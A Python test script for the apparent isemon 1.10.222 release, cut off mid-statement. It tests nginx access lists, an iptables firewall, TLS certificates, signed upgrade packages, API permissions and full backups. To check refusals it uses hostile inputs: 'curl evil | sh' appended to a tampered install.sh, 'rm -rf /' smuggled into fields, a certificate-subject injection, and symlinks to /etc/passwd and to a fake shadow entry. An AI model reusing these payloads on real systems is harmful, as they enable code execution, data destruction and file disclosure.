#!/usr/bin/env python3
"""1.10.222: what the pages may ask of root, as otp does it - who may reach
which page and the machine's firewall (isemon_web.py), the certificate and
TLS (the same helper), a new version put in from the page with a progress
bar (isemon_upgrade.py, signed packages), and a full backup that carries the
keys. The helpers are run here for real: nginx -t against the vhost this
package ships, iptables in a network namespace of its own, openssl for every
certificate, and a package signed and refused the ways one can be.

    ./test/fixes222.py
"""
import base64
import json
import os
import random
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT))
os.environ['ISEMON_WEB_HELPER'] = '1'
os.environ['ISEMON_UPGRADE_HELPER'] = '1'
import isemon                                        # noqa: E402

PASS = FAIL = 0
PORT = 19900 + random.randint(0, 90)


def ok(what, got, want=True):
    global PASS, FAIL
    if got == want:
        PASS += 1
        print('  ok    %s' % what)
    else:
        FAIL += 1
        print('  FAIL  %s\n          got  %r\n          want %r' % (what, got, want))


def sh(*args, **kw):
    return subprocess.run(list(args), capture_output=True, text=True, **kw)


work = Path(tempfile.mkdtemp(prefix='isemon-222-'))
state = work / 'state'
(state / 'web').mkdir(parents=True)
(state / 'upgrade').mkdir(parents=True)
isemon.STATE_DIR = state
isemon.DB_FILE = state / 'd.db'
isemon.BACKUP_DIR = state / 'backups'
isemon.DUMP_DIR = state / 'dumps'
isemon.RUN_DIR = state
isemon.LOG_DIR = state
isemon.CONFIG_FILE = state / 'config.json'
isemon._LOG_PATH = state / 'd.log'
isemon.TOKEN_FILE = state / 'api-token'
isemon.CONFIG.clear()
isemon.CONFIG.update(isemon.DEFAULTS)
isemon.CONFIG.update({'api_port': PORT, 'geo': 0, 'mikrotik1': 0})
(state / 'config.json').write_text(json.dumps({'db_engine': 'sqlite', 'db_password': 'hush'}))
store = isemon.Storage(isemon.DB_FILE)
daemon = isemon.Daemon(store)
wr = daemon.webroot

NGINX = work / 'nginx' / 'isemon.conf'
CERTS = work / 'certs'
NGINX.parent.mkdir()
CERTS.mkdir()
shutil.copy(str(ROOT / 'deploy' / 'nginx-isemon.conf'), str(NGINX))
text = NGINX.read_text().replace('/etc/nginx/certs', str(CERTS))
NGINX.write_text(text)
sh('openssl', 'req', '-x509', '-nodes', '-newkey', 'rsa:2048', '-days', '30', '-keyout',
   str(CERTS / 'isemon.key'), '-out', str(CERTS / 'isemon.pem'), '-subj', '/CN=old.example.cz')
RSYS = work / 'rsyslog.d'
RSYS.mkdir()
shutil.copy(str(ROOT / 'deploy' / 'rsyslog-ise.conf'), str(RSYS / '10-ise.conf'))
(RSYS / '20-relp.conf').write_text('module(load="imrelp")\ninput(type="imrelp" port="2514")\n'
                                   '# input(type="imudp" port="9999")\n')
S4, S6 = work / 's4', work / 's6'
BASE4 = ('*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n'
         '-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -j REJECT\nCOMMIT\n')
S4.write_text(BASE4)
S6.write_text(BASE4)
HELPER_ENV = dict(os.environ, ISEMON_STATE=str(state), ISEMON_NGINX_CONF=str(NGINX),
                  ISEMON_CERT_DIR=str(CERTS), ISEMON_WEB_NO_SERVICES='1',
                  ISEMON_FW_FILE4=str(S4), ISEMON_FW_FILE6=str(S6),
                  ISEMON_RSYSLOG=str(RSYS))
NETNS = shutil.which('unshare') and sh('unshare', '--net', 'true').returncode == 0
HAVE_NGINX = bool(shutil.which('nginx'))


def root_runs():
    """isemon-web.service, as systemd would start it (in a namespace of its
    own, so the firewall it writes is that one's)."""
    cmd = ['python3', '-I', str(ROOT / 'deploy' / 'isemon_web.py')]
    if NETNS:
        cmd = ['unshare', '--net'] + cmd
    return sh(*cmd, env=HELPER_ENV)


def nginx_takes():
    """nginx -t on the vhost as it is now (the IPv6 listens left out: the
    test machine may have no IPv6)."""
    if not HAVE_NGINX:
        return True
    t = work / 'ngx'
    t.mkdir(exist_ok=True)
    (t / 'v.conf').write_text('\n'.join(l for l in NGINX.read_text().split('\n')
                                        if '[::]:' not in l))
    shutil.copy('/etc/nginx/fastcgi_params', str(t / 'fastcgi_params')) \
        if os.path.exists('/etc/nginx/fastcgi_params') else (t / 'fastcgi_params').write_text('')
    (t / 'n.conf').write_text('user root;\nevents {}\nhttp { include %s; }\n' % (t / 'v.conf'))
    got = sh('nginx', '-t', '-c', str(t / 'n.conf'))
    if got.returncode != 0:
        print(got.stderr[-600:])
    return got.returncode == 0


try:
    # ------------------------------------------------------------------------
    print('\nNothing is asked of root until somebody saves something')
    ok('no request at all', wr.request(), None)
    ok('...and the minute\'s pass asks nothing', wr.due(), False)
    ok('...so nothing is laid down', (state / 'web' / 'request.json').exists(), False)
    root_runs()
    ok('the vhost root saw is the one install.sh wrote, untouched',
       NGINX.read_text() == text)
    ok('a look writes nothing but look.json',
       (state / 'web' / 'look.json').exists() or not (state / 'web' / 'look.ask').exists())
    wr.write('look.ask', {'at': time.time()})
    root_runs()
    look = wr.read('look.json') or {}
    ok('root reads what rsyslog listens on - commented lines left out',
       sorted((p['proto'], p['port']) for p in look.get('rsyslog') or []),
       [('tcp', '2514'), ('tcp', '514'), ('udp', '514')])
    ok('...and the dashboard\'s list as install.sh wrote it',
       (look.get('access') or {}).get('dashboard'),
       {'any': False, 'from': ['192.168.0.0/16', '172.16.0.0/12', '10.0.0.0/8'],
        'marked': False})
    ok('...and the certificate nginx answers with', (look.get('cert') or {}).get('pem', '')
       .startswith('-----BEGIN CERTIFICATE-----'))

    # ------------------------------------------------------------------------
    print('\nWhat the page sends is checked before it is kept')
    for bad, why in (({'family': 4, 'proto': 'tcp', 'port': '80,443\n'}, 'a newline in a port'),
                     ({'family': 4, 'proto': 'icmp', 'port': '22'}, 'a port for ICMP'),
                     ({'family': 4, 'proto': 'tcp', 'port': '70000'}, 'a port out of range'),
                     ({'family': 6, 'source': '10.0.0.0/8'}, 'an IPv4 network for IPv6'),
                     ({'source': 'fe80::1%eth0}'}, 'a scope id with a brace'),
                     ({'proto': 'gre'}, 'a protocol nobody offers'),
                     ({'action': 'masquerade'}, 'an action that is not one'),
                     ({'family': 4, 'proto': 'tcp', 'port': ','.join(str(i) for i in range(1, 17))},
                      'more than fifteen ports')):
        try:
            isemon.WebRoot.rule_checked(bad)
            ok('refused: ' + why, False)
        except isemon.WebRootError:
            ok('refused: ' + why, True)
    r = isemon.WebRoot.rule_checked({'proto': 'tcp', 'port': '10050', 'source': '10.9.9.9',
                                     'note': 'Zabbix; rm -rf / "x"'})
    ok('the family is taken from the address', r['family'], 4)
    ok('a note keeps nothing a shell or iptables could read otherwise',
       r['note'], 'Zabbix rm -rf / x')
    try:
        wr.access_checked({'dashboard': {'any': False, 'from': []}})
        ok('a dashboard for nobody is refused', False)
    except isemon.WebRootError:
        ok('a dashboard for nobody is refused', True)
    acc = wr.access_checked({'dashboard': {'any': False, 'from': '10.0.0.0/8 2001:db8::/32 '
                                                                 '127.0.0.1 192.0.2.7/32'},
                             'banfeed': {'any': True}, 'health': {'same': True}})
    ok('the lists: the machine itself is never in them, one address is an address',
       acc['dashboard']['from'], ['10.0.0.0/8', '2001:db8::/32', '192.0.2.7'])

    # ------------------------------------------------------------------------
    print('\nWho may reach which page, put in by root')
    said = wr.firewall_save({'access': {'dashboard': {'any': False, 'from': '10.0.0.0/8, '
                                                                            '2001:db8::/32'},
                                        'banfeed': {'any': False, 'from': '198.51.100.7'},
                                        'health': {'any': True}}}, 'boss')
    ok('saved, and root asked', (said['ok'], (state / 'web' / 'request.json').exists()),
       (True, True))
    got = root_runs()
    st = json.loads((state / 'web' / 'status.json').read_text())
    ok('root put it in', st.get('state'), 'done')
    v = NGINX.read_text()
    ok('the dashboard\'s list between marks, the machine itself after it',
       '    # DASHBOARD-ALLOW-BEGIN\n    allow 10.0.0.0/8;\n    allow 2001:db8::/32;\n'
       '    # DASHBOARD-ALLOW-END\n    allow 127.0.0.1;\n    allow ::1;\n    deny  all;' in v)
    ok('...and install.sh\'s three networks gone from it', 'allow 172.16.0.0/12;' in v, False)
    ok('the ban feed has a location and a list of its own',
       'location = /banfeed.php {' in v and 'allow 198.51.100.7;' in v)
    ok('...handed to PHP the way the .php location does it',
       'fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;' in
       v.split('location = /banfeed.php {')[1].split('}')[0])
    ok('the health check is for everybody', 'location = /healthz.php {' in v and
       'allow all;' in v.split('location = /healthz.php {')[1].split('}')[0])
    ok('nginx takes it', nginx_takes())
    ok('the page says it is in place', wr.state()['current'])
    wr.firewall_save({'access': {'dashboard': {'any': False, 'from': '10.0.0.0/8, 2001:db8::/32'},
                                 'banfeed': {'same': True}, 'health': {'same': True}}}, 'boss')
    root_runs()
    v2 = NGINX.read_text()
    ok('"as the dashboard" takes the locations of their own out again',
       ('location = /banfeed.php' in v2, 'location = /healthz.php' in v2), (False, False))
    ok('...and saved twice, the file is the same', v2.count('DASHBOARD-ALLOW-BEGIN'), 1)
    ok('nginx still takes it', nginx_takes())
    # nginx refusing: everything put back as it was.
    before = NGINX.read_text()
    NGINX.write_text(before.replace('location ~ \\.php$ {', 'location ~ \\.php$ {\n        '
                                                            'bogus_directive on;'))
    broken = NGINX.read_text()
    env2 = dict(HELPER_ENV)
    env2.pop('ISEMON_WEB_NO_SERVICES')
    if HAVE_NGINX:
        fake = work / 'bin'
        fake.mkdir(exist_ok=True)
        (fake / 'nginx').write_text('#!/bin/sh\necho "nginx: [emerg] unknown directive" >&2\nexit 1\n')
        (fake / 'systemctl').write_text('#!/bin/sh\nexit 0\n')
        (fake / 'restorecon').write_text('#!/bin/sh\nexit 0\n')
        for f in fake.iterdir():
            f.chmod(0o755)
        env2['PATH'] = '%s:%s' % (fake, os.environ.get('PATH', ''))
        wr.firewall_save({'access': {'dashboard': {'any': True}}}, 'boss')
        sh('unshare', '--net', 'python3', '-I', str(ROOT / 'deploy' / 'isemon_web.py'),
           env=env2) if NETNS else sh('python3', '-I', str(ROOT / 'deploy' / 'isemon_web.py'),
                                       env=env2)
        st = json.loads((state / 'web' / 'status.json').read_text())
        ok('nginx saying no: failed, and said why', (st.get('state'),
                                                     'nginx does not take it' in st['said'][0]),
           ('failed', True))
        ok('...and the vhost is exactly as it was', NGINX.read_text(), broken)
        ok('...and the page says root did not put it in', wr.state()['current'], False)
        ok('...and the minute\'s pass does not ask the same again by itself', wr.due(), False)
    NGINX.write_text(before)

    # ------------------------------------------------------------------------
    print('\nThe machine\'s firewall')
    if not NETNS:
        print('  (no network namespace here: the firewall is not tried for real)')
    wr.firewall_save({'on': True, 'off': ['dhcpv6'],
                      'rules': [{'proto': 'tcp', 'port': '10050', 'source': '10.9.9.9',
                                 'note': 'Zabbix'},
                                {'family': 0, 'proto': 'tcp', 'port': '8000-8100',
                                 'action': 'drop', 'note': 'nobody'},
                                {'proto': 'udp', 'port': '161', 'disabled': True}],
                      'logs': {'any': False, 'from': '10.1.2.3, 2001:db8::5'},
                      'access': {'dashboard': {'any': False, 'from': '10.0.0.0/8'}}}, 'boss')
    req = json.loads((state / 'web' / 'request.json').read_text())
    notes = [r['note'] for r in req['fw']['rules']]
    ok('your rules first, in their order, then what isemon needs',
       notes[:3], ['Zabbix', 'nobody', 'nobody'])
    ok('a rule that is not in force is not put in', any(r['port'] == '161'
                                                        for r in req['fw']['rules']), False)
    ok('a rule for both families is one each', [r['family'] for r in req['fw']['rules']
                                                if r['note'] == 'nobody'], [4, 6])
    ok('the dashboard is let in from its list only', sorted(
        r['source'] for r in req['fw']['rules'] if r['note'] == 'the dashboard'), ['10.0.0.0/8'])
    ok('the logs from the senders named, on every port rsyslog listens on', sorted(
        (r['proto'], r['port'], r['source']) for r in req['fw']['rules']
        if r['note'].startswith('logs')), sorted(
        [(p, port, src) for p, port in (('udp', '514'), ('tcp', '514'), ('tcp', '2514'))
         for src in ('10.1.2.3', '2001:db8::5')]))
    ok('what was turned off is not let in', any(r['note'] == 'DHCPv6 client'
                                                for r in req['fw']['rules']), False)
    if NETNS:
        script = work / 'fw.sh'
        script.write_text('iptables-restore < %s\nip6tables-restore < %s\n'
                          'python3 -I %s\niptables -S > %s/live4\nip6tables -S > %s/live6\n'
                          % (S4, S6, ROOT / 'deploy' / 'isemon_web.py', work, work))
        sh('unshare', '--net', 'bash', str(script), env=HELPER_ENV)
        live4 = (work / 'live4').read_text()
        ok('the chain is first in INPUT', live4.split('\n').index('-A INPUT -j ISEMON-IN')
           < live4.split('\n').index('-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT'))
        ok('...loopback and the answers first in it, then the rules of your own',
           [l for l in live4.split('\n') if l.startswith('-A ISEMON-IN')][:3] == [
               '-A ISEMON-IN -i lo -m comment --comment "isemon: loopback" -j ACCEPT',
               '-A ISEMON-IN -m conntrack --ctstate RELATED,ESTABLISHED -m comment --comment '
               '"isemon: answers" -j ACCEPT',
               '-A ISEMON-IN -s 10.9.9.9/32 -p tcp -m tcp --dport 10050 -m comment --comment '
               '"isemon: Zabbix" -j ACCEPT'])
        ok('a range of ports, as iptables writes it', '--dport 8000:8100' in live4 and
           '-j DROP' in live4)
        ok('IPv6 gets neighbour discovery', 'ipv6-icmptype 135' in (work / 'live6').read_text()
           or 'icmpv6-type 135' in (work / 'live6').read_text())
        f4 = S4.read_text()
        ok('kept over a reboot: the file has the chain, between marks',
           ':ISEMON-IN - [0:0]' in f4 and '# isemon: end' in f4)
        ok('...and the rules that were there are where they were',
           '-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -j REJECT' in f4)
        wr.firewall_save({'on': False}, 'boss')
        sh('unshare', '--net', 'bash', str(script), env=HELPER_ENV)
        ok('turned off: the file is the one there was, to the byte', S4.read_text(), BASE4)
        ok('...and the chain is gone', 'ISEMON-IN' in (work / 'live4').read_text(), False)
        # A file iptables-restore would refuse is left as it was.
        S4.write_text(BASE4.replace('COMMIT', '-A INPUT --no-such-option 1 -j ACCEPT\nCOMMIT'))
        bad_file = S4.read_text()
        wr.firewall_save({'on': True}, 'boss')
        sh('unshare', '--net', 'bash', '-c', 'python3 -I %s' % (ROOT / 'deploy' / 'isemon_web.py'),
           env=HELPER_ENV)
        st = json.loads((state / 'web' / 'status.json').read_text())
        ok('a file iptables would not take: failed, and the file as it was',
           (st.get('state'), S4.read_text() == bad_file), ('failed', True))
        S4.write_text(BASE4)
        wr.firewall_save({'on': False}, 'boss')
        root_runs()

    # ------------------------------------------------------------------------
    print('\nCertificates and TLS')
    ca = work / 'ca'
    ca.mkdir()
    sh('openssl', 'req', '-x509', '-nodes', '-newkey', 'rsa:2048', '-days', '365', '-keyout',
       str(ca / 'root.key'), '-out', str(ca / 'root.pem'), '-subj', '/CN=Test Root CA',
       '-addext', 'basicConstraints=critical,CA:TRUE', '-addext', 'keyUsage=critical,keyCertSign')
    sh('openssl', 'req', '-new', '-nodes', '-newkey', 'rsa:2048', '-keyout', str(ca / 'mid.key'),
       '-out', str(ca / 'mid.csr'), '-subj', '/CN=Test Intermediate')
    (ca / 'mid.ext').write_text('basicConstraints=critical,CA:TRUE\nkeyUsage=critical,keyCertSign\n')
    sh('openssl', 'x509', '-req', '-in', str(ca / 'mid.csr'), '-CA', str(ca / 'root.pem'), '-CAkey',
       str(ca / 'root.key'), '-CAcreateserial', '-days', '300', '-out', str(ca / 'mid.pem'),
       '-extfile', str(ca / 'mid.ext'))
    sh('openssl', 'req', '-new', '-nodes', '-newkey', 'rsa:2048', '-keyout', str(ca / 'leaf.key'),
       '-out', str(ca / 'leaf.csr'), '-subj', '/CN=isemon.example.cz')
    (ca / 'leaf.ext').write_text('subjectAltName=DNS:isemon.example.cz,IP:192.0.2.10\n')
    sh('openssl', 'x509', '-req', '-in', str(ca / 'leaf.csr'), '-CA', str(ca / 'mid.pem'), '-CAkey',
       str(ca / 'mid.key'), '-CAcreateserial', '-days', '200', '-out', str(ca / 'leaf.pem'),
       '-extfile', str(ca / 'leaf.ext'))
    leaf, mid, rootc, key = [(ca / n).read_text() for n in ('leaf.pem', 'mid.pem', 'root.pem',
                                                            'leaf.key')]
    got = isemon.tls_sort([rootc + key + leaf + mid])
    ok('pasted in any order, sorted: the one of the key, the chain up, the root',
       (got['cert'] == leaf, got['chain'] == mid, got['root'] == rootc), (True, True, True))
    ok('...its names read', got['facts']['names'], ['isemon.example.cz', '192.0.2.10'])
    ok('...and the chain checked against the root',
       isemon.tls_check_chain(got['cert'], got['chain'], got['root']),
       'the chain leads to the root')
    try:
        isemon.tls_check_chain(leaf, '', rootc)
        ok('without its intermediate it does not lead to the root', False)
    except isemon.WebRootError:
        ok('without its intermediate it does not lead to the root', True)
    try:
        isemon.tls_sort([leaf + (CERTS / 'isemon.key').read_text()])
        ok('a key that is not the certificate\'s is refused', False)
    except isemon.WebRootError as e:
        ok('a key that is not the certificate\'s is refused', 'not the one' in str(e))
    sh('openssl', 'pkcs12', '-export', '-out', str(ca / 'p.pfx'), '-inkey', str(ca / 'leaf.key'),
       '-in', str(ca / 'leaf.pem'), '-certfile', str(ca / 'mid.pem'), '-passout', 'pass:Heslo-123')
    pfx = (ca / 'p.pfx').read_bytes()
    try:
        isemon.tls_sort([], 'wrong', pfx)
        ok('a .pfx with the wrong password is refused', False)
    except isemon.WebRootError as e:
        ok('a .pfx with the wrong password is refused, and says the password',
           'password' in str(e))
    got = isemon.tls_sort([], 'Heslo-123', pfx)
    ok('a .pfx opened with its password', (got['cert'] == leaf, got['chain'] == mid,
                                           bool(got['key'])), (True, True, True))
    derb = subprocess.run(['openssl', 'x509', '-in', str(ca / 'leaf.pem'), '-outform', 'DER'],
                          capture_output=True).stdout
    got = isemon.tls_sort([derb])
    ok('a .cer that is DER is read', got['facts']['cn'], 'isemon.example.cz')
    said = wr.tls_do({'action': 'upload', 'pfx': base64.b64encode(pfx).decode(),
                      'password': 'Heslo-123', 'pem': [rootc]}, 'boss')
    ok('uploaded on the page', said['ok'])
    t = wr.tls_conf()
    ok('kept, with the key sealed', (t['managed'], t['key'].startswith(isemon.SEALED),
                                     'PRIVATE KEY' in json.dumps(t)), (True, True, False))
    root_runs()
    ok('root put it in: certificate and chain in nginx\'s file',
       (CERTS / 'isemon.pem').read_text() == leaf + mid)
    ok('...the key 0600', oct((CERTS / 'isemon.key').stat().st_mode & 0o777), '0o600')
    ok('...the root for ssl_trusted_certificate', 'ssl_trusted_certificate' in NGINX.read_text())
    ok('...the pair install.sh made kept once beside it',
       (CERTS / 'isemon.pem.before-isemon').read_text().startswith('-----BEGIN CERTIFICATE-----'))
    ok('nginx takes it', nginx_takes())
    wr.tls_do({'action': 'settings', 'preset': 'intermediate', 'hsts': 31536000}, 'boss')
    root_runs()
    v = NGINX.read_text()
    ok('Mozilla intermediate: the DHE ciphers, an RFC 7919 group, HSTS a year',
       ('DHE-RSA-AES128-GCM-SHA256' in v, 'ssl_dhparam' in v,
        '"max-age=31536000" always' in v), (True, True, True))
    ok('...the group made by openssl', (CERTS / 'isemon-dh.pem').read_text().startswith(
        '-----BEGIN DH PARAMETERS-----') or 'PARAMETERS' in (CERTS / 'isemon-dh.pem').read_text())
    try:
        wr.tls_do({'action': 'settings', 'preset': 'custom', 'ciphers': 'NOT-A-CIPHER'}, 'boss')
        ok('a cipher list OpenSSL does not know is refused', False)
    except isemon.WebRootError:
        ok('a cipher list OpenSSL does not know is refused', True)
    try:
        wr.tls_do({'action': 'settings', 'preset': 'custom', 'ciphers': 'ALL;rm -rf /'}, 'boss')
        ok('...and one with anything else in it', False)
    except isemon.WebRootError:
        ok('...and one with anything else in it', True)
    said = wr.tls_do({'action': 'csr', 'cn': 'isemon.example.cz', 'san': 'blacklist.example.cz, '
                                                                        '192.0.2.10', 'o': 'Ex',
                      'c': 'cz', 'key': 'ec256'}, 'boss')
    ok('a request made here', said['csr'].startswith('-----BEGIN CERTIFICATE REQUEST-----'))
    csr_text = sh('openssl', 'req', '-noout', '-text', input=said['csr']).stdout
    ok('...for the names asked', ('DNS:blacklist.example.cz' in csr_text,
                                  'IP Address:192.0.2.10' in csr_text, 'C = CZ' in csr_text),
       (True, True, True))
    try:
        wr.tls_do({'action': 'csr', 'cn': 'x/CN=evil'}, 'boss')
        ok('a name that would be another field is refused', False)
    except isemon.WebRootError:
        ok('a name that would be another field is refused', True)
    (ca / 'pend.csr').write_text(said['csr'])
    sh('openssl', 'x509', '-req', '-in', str(ca / 'pend.csr'), '-CA', str(ca / 'mid.pem'),
       '-CAkey', str(ca / 'mid.key'), '-CAcreateserial', '-days', '90', '-out',
       str(ca / 'pend.pem'), '-copy_extensions', 'copy')
    said = wr.tls_do({'action': 'upload', 'pem': [(ca / 'pend.pem').read_text() + mid]}, 'boss')
    ok('the certificate the CA sent back is enough: its key waited here', said['ok'])
    ok('...and the request is done with', wr.tls_conf().get('pending'), None)
    try:
        wr.tls_do({'action': 'upload', 'pem': [leaf]}, 'boss')
        ok('a certificate alone, with no request waiting, is refused', False)
    except isemon.WebRootError:
        ok('a certificate alone, with no request waiting, is refused', True)
    ok('the days left are said', wr.tls_page(True)['kept']['days'] in (88, 89, 90))
    said = wr.tls_do({'action': 'forget'}, 'boss')
    ok('let go: nothing of TLS asked of root any more', 'tls' in (wr.request() or {}), False)

    # ------------------------------------------------------------------------
    print('\nThrough the API: who may do what')
    daemon.add_user('boss', 'a-long-enough-password', 'fulladmin', by='test')
    daemon.add_user('watcher', 'a-third-long-password', 'readonly', by='test')
    api = isemon.ApiServer(daemon, PORT)
    api.start()
    time.sleep(0.4)

    def call(path, payload=None, session=None, raw=None):
        req = urllib.request.Request('http://127.0.0.1:%d%s' % (PORT, path),
                                     data=raw if raw is not None else (
                                         json.dumps(payload).encode() if payload is not None
                                         else None),
                                     method='POST' if (payload is not None or raw is not None)
                                     else 'GET')
        req.add_header('X-Isemon-Token', isemon.API_TOKEN)
        req.add_header('Content-Type', 'application/octet-stream' if raw is not None
                       else 'application/json')
        if session:
            req.add_header('X-Isemon-Session', session)
        try:
            with urllib.request.urlopen(req, timeout=120) as answer:
                return answer.status, json.loads(answer.read().decode() or '{}')
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode() or '{}')
    tok = {n: call('/api/auth/login', {'name': n, 'password': p})[1]['token']
           for n, p in (('boss', 'a-long-enough-password'), ('watcher', 'a-third-long-password'))}
    ok('read only may look at the firewall', (call('/api/web/firewall', session=tok['watcher'])[0],
                                              call('/api/web/firewall', session=tok['watcher'])[1]
                                              ['may']), (200, False))
    for path, body in (('/api/web/firewall', {'on': True}), ('/api/web/tls', {'action': 'forget'}),
                       ('/api/upgrade', {'action': 'start'})):
        ok('...and may not change %s' % path, call(path, body, tok['watcher'])[0], 403)
    ok('...nor send a package', call('/api/upgrade/package', session=tok['watcher'],
                                     raw=b'x' * 10)[0], 403)
    ok('nobody signed out may look', call('/api/web/tls')[0], 401)
    st, said = call('/api/web/firewall', {'action': 'rule_check', 'rule': {'proto': 'tcp',
                                                                           'port': '99999'}},
                    tok['boss'])
    ok('a rule checked on the page before it is kept', st, 400)

    # ------------------------------------------------------------------------
    print('\nUpgrades from the page, signed')
    keys = work / 'keys'
    keys.mkdir()
    sh('openssl', 'genpkey', '-algorithm', 'ED25519', '-out', str(keys / 'r.key'))
    sh('openssl', 'pkey', '-in', str(keys / 'r.key'), '-pubout', '-out', str(keys / 'test-release.pub'))
    os.environ['ISEMON_RELEASE_KEYS'] = str(keys)
    lib = work / 'lib'
    lib.mkdir()
    (lib / 'isemon.py').write_text("__version__ = '%s'\n" % isemon.__version__)
    os.environ['ISEMON_LIB'] = str(lib)

    def package(version, sign=True, extra=None, tamper=False, link=False):
        top = work / 'pk' / ('isemon-%s' % version)
        if top.parent.exists():
            shutil.rmtree(str(top.parent))
        (top / 'deploy' / 'release-keys').mkdir(parents=True)
        shutil.copy(str(keys / 'test-release.pub'), str(top / 'deploy' / 'release-keys'))
        (top / 'isemon.py').write_text("__version__ = '%s'\n" % version)
        (top / 'README.md').write_text('## Version\n\n%s\n\n- what changed\n\n1.0.0\n\n- old\n'
                                       % version)
        (top / 'install.sh').write_text('#!/bin/bash\nfor i in 1 2 3 4 5 6 7 8; do printf '
                                        '"@@progress %d/8 step %d\\n" $i $i; done\n'
                                        'echo done here\n')
        out = work / ('isemon-%s.tar.gz' % version)
        if sign:
            got = sh(sys.executable, str(ROOT / 'tools' / 'release.py'), str(top),
                     str(keys / 'r.key'), str(out))
            if got.returncode:
                print(got.stdout, got.stderr)
        if tamper:
            with open(str(top / 'install.sh'), 'a') as f:
                f.write('curl evil | sh\n')
        if extra:
            (top / extra).write_text('not signed\n')
        if link:
            os.symlink('/etc/passwd', str(top / 'passwd'))
        if tamper or extra or link or not sign:
            with tarfile.open(str(out), 'w:gz') as tar:
                tar.add(str(top), arcname=top.name)
        return out
    up = daemon.upgrades
    nxt = '.'.join(isemon.__version__.split('.')[:2] + [str(int(isemon.__version__.split('.')[2])
                                                             + 1)])
    for why, kw, word in (('unsigned', {'sign': False}, 'not signed'),
                          ('changed after it was signed', {'tamper': True}, 'is not the file'),
                          ('a file nobody signed', {'extra': 'more.txt'}, 'not signed'),
                          ('a link in it', {'link': True}, 'not a plain file')):
        try:
            up.take(package(nxt, **kw), 'boss')
            ok('refused: ' + why, False)
        except isemon.WebRootError as e:
            ok('refused: %s (%s)' % (why, word), word in str(e))
    try:
        up.take(package('1.0.1'), 'boss')
        ok('refused: older than what runs', False)
    except isemon.WebRootError as e:
        ok('refused: older than what runs', 'older' in str(e))
    st, said = call('/api/upgrade/package', session=tok['boss'],
                    raw=package(nxt).read_bytes())
    ok('a signed package taken on the page', (st, (said.get('package') or {}).get('version')),
       (200, nxt))
    ok('...what changed in it read from its README', said['package']['changelog'],
       '- what changed')
    st, said = call('/api/upgrade', {'action': 'start'}, tok['boss'])
    ok('started: the request laid down for root', (st, (state / 'upgrade' / 'request.json')
                                                   .exists()), (200, True))
    ok('...and the bar starts at once', said['run']['progress']['words'], 'waiting for root')
    ok('a second start while it runs is refused', call('/api/upgrade', {'action': 'start'},
                                                       tok['boss'])[0], 400)
    got = sh('python3', '-I', str(ROOT / 'deploy' / 'isemon_upgrade.py'),
             env=dict(os.environ, ISEMON_STATE=str(state)))
    st = up.read_json('status.json') or {}
    if os.geteuid() == 0:
        ok('root put it in, and install.sh said how far it was',
           (st.get('state'), st.get('progress', {}).get('pct'), st.get('progress', {}).get('step'),
            st.get('progress', {}).get('total')), ('done', 100, 8, 8))
        ok('...the progress lines are not in the log, its own words are',
           ('@@progress' in '\n'.join(up.page()['log']), 'done here' in '\n'.join(up.page()['log'])),
           (False, True))
    sh_src = (ROOT / 'install.sh').read_text()
    ok('install.sh says how far an upgrade is, from the pages only',
       'printf \'@@progress %d/%d %s\\n\'' in sh_src and sh_src.count('    progress ') >= 8)
    ok('...and refuses to run beside one from the pages',
       'an upgrade from the pages is running (isemon-upgrade.service)' in sh_src)
    ok('the units and the helpers are installed by it, fresh and on an upgrade',
       sh_src.count('\nroot_helpers\n') + sh_src.count('    root_helpers\n') >= 2)

    # ------------------------------------------------------------------------
    print('\nA full backup')
    wr.tls_do({'action': 'selfsigned', 'cn': 'isemon.example.cz'}, 'boss')
    daemon.banfeed_key(make=True)
    (state / 'known_hosts').write_text('10.0.0.1 ssh-ed25519 AAAAC3Nza\n')
    req = urllib.request.Request('http://127.0.0.1:%d/api/db/download?full=1' % PORT)
    req.add_header('X-Isemon-Token', isemon.API_TOKEN)
    req.add_header('X-Isemon-Session', tok['boss'])
    with urllib.request.urlopen(req, timeout=120) as answer:
        full = work / 'full.db'
        full.write_bytes(answer.read())
        name = answer.headers.get('Content-Disposition', '')
    ok('downloaded as a full backup', '-full' in name)
    carried = isemon.carried_in(full)
    ok('it carries the keys and the machine\'s config', sorted(carried),
       ['banfeed.key', 'config.json', 'known_hosts', 'settings.key'])
    ok('...the database password not among them', json.loads(carried['config.json'])
       ['db_password'], '')
    ok('an ordinary copy carries none of it', isemon.carried_in(store.backup(label='plain')), {})
    key_before = (state / 'settings.key').read_text()
    (state / 'settings.key').write_text('0' * 64 + '\n')      # as if another machine
    st, said = call('/api/db/restore?check=1', session=tok['boss'], raw=full.read_bytes())
    ok('checked first: it says it is a full backup', said['says']['carried'],
       ['banfeed.key', 'config.json', 'known_hosts', 'settings.key'])
    st, said = call('/api/db/restore', session=tok['boss'], raw=full.read_bytes())
    ok('put back: the keys in place', (st, said.get('carried')),
       (200, ['settings.key']))
    ok('...the key is the one of the machine it was made on',
       (state / 'settings.key').read_text(), key_before)
    ok('...the one that was here kept beside it', any(
        p.name.startswith('settings.key.before-restore-') for p in state.iterdir()))
    ok('...the certificate\'s key opens again', wr.tls_page(True)['key_ok'], True)
    ok('...and the keys are not left in the live database', store.db.execute(
        "SELECT COUNT(*) FROM sqlite_master WHERE name='isemon_carried'").fetchone()[0], 0)
    ok('...so the next ordinary copy carries none of them',
       isemon.carried_in(store.backup(label='after')), {})
    # What the security review found (1.10.222): nothing is read through a
    # link, a secret by any name is left out of config.json.
    secret = work / 'not-ours'
    secret.write_text('root:$6$hash:19000:0:99999:7:::\n')
    os.unlink(str(state / 'known_hosts'))
    os.symlink(str(secret), str(state / 'known_hosts'))
    ok('a link put where known_hosts is, is not followed into a backup',
       'known_hosts' in isemon.carried_files(), False)
    os.unlink(str(state / 'known_hosts'))
    os.link(str(secret), str(state / 'known_hosts'))
    ok('...nor a hard link to somebody else\'s file',
       'known_hosts' in isemon.carried_files(), False)
    os.unlink(str(state / 'known_hosts'))
    (state / 'config.json').write_text(json.dumps({'db_password': 'a', 'mikrotik_opn_apisecret': 'b',
